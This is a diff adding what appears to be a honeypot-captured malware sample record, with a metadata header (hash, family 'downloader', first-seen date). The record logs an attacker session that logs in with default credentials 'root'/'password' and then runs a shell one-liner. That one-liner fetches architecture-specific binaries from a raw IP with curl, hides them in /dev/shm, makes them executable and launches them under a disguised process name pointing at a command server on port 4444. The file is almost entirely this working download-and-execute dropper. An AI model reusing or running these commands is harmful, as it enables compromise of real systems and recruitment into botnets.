@@ -1,0 +1,14 @@
+# sha256: 74ca3d600604127f6358cf8dd067195b1c08afcb18aeb5124949a97d214c8ac2
+# family: downloader
+# kind: script
+# size_bytes: 324
+# first_seen: 2026-07-18 14:02:34.908928 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+root
+password
+uname -m
+cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk http://103.211.206.49/main_${arch} -o .sysd 2>/dev/null && chmod +x .sysd && (exec -a /usr/sbin/sysd ./.sysd 103.211.206.49 4444 >/dev/null 2>&1 &) && break; done
+exec -a /usr/sbin/sysd ./.sysd 103.211.206.49 4444 > /dev/null 2 >& 1 &
